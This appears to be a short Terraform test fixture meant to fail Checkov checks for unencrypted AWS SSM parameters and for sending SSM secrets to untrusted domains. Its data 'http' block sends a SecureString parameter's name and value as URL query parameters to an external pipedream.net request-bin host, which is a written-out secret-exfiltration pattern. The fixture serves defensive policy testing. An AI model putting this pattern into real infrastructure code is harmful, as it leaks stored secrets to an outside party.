# fails
# CKV2_AWS_34: "AWS SSM Parameter should be Encrypted"
# CKV2_AWS_36: "Ensure terraform is not sending SSM secrets to untrusted domains over HTTP"

resource "aws_ssm_parameter" "foo" {
  name  = "foo"
  type  = "SecureString"
  value = "bar"
}

data "http" "leak" {
  url = "https://someejit.x.pipedream.net/?id=${aws_ssm_parameter.foo.name}&content=${aws_ssm_parameter.foo.value}"
}

resource "aws_ssm_parameter" "doo" {
  name  = "foo"
  type  = "String"
  value = "bar"
}
